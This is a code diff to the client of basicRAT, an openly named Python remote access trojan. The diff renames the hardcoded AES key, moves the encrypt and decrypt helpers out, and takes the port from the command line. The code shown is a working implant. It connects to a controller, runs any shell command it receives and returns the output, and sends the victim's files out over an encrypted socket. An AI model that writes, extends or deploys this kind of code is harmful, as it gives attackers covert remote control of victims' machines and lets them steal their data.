@@ -5,28 +5,9 @@ from basicRAT import *
 
 HOST = 'localhost'
 PORT = 1337
-KEY  = '82e672ae054aa4de6f042c888111686a'
+FALLBACK_KEY  = '82e672ae054aa4de6f042c888111686a'
 # generate your own key with...
 # python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
-
-
-def pad(s):
-    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
-
-
-def encrypt(plaintext):
-    plaintext = pad(plaintext)
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    return iv + cipher.encrypt(plaintext)
-
-
-def decrypt(ciphertext):
-    iv = ciphertext[:AES.block_size]
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext.rstrip(b'\0')
-
 
 def main():
     s = socket.socket()
@@ -34,7 +15,7 @@ def main():
 
     while True:
         data = s.recv(1024)
-        data = decrypt(data).split()
+        data = decrypt(data, FALLBACK_KEY).split()
 
         # seperate data into command and action
         cmd, action = data[0], ' '.join(data[1:])
@@ -51,7 +32,7 @@ def main():
         # run command
         elif cmd == 'run':
             results = os.popen(action).read()
-            s.sendall(encrypt(results))
+            s.sendall(encrypt(results, FALLBACK_KEY))
 
         # send file
         elif cmd == 'download':
@@ -60,11 +41,12 @@ def main():
             f = open(f_name, 'rb')
             results = f.read(1024)
             while True:
-                s.send(encrypt(results))
+                s.send(encrypt(results, FALLBACK_KEY))
                 results = f.read(1024)
                 if results == '':
                     break
 
 
 if __name__ == '__main__':
+    PORT = int(sys.argv[1]) if sys.argv[1] else 1337
     main()
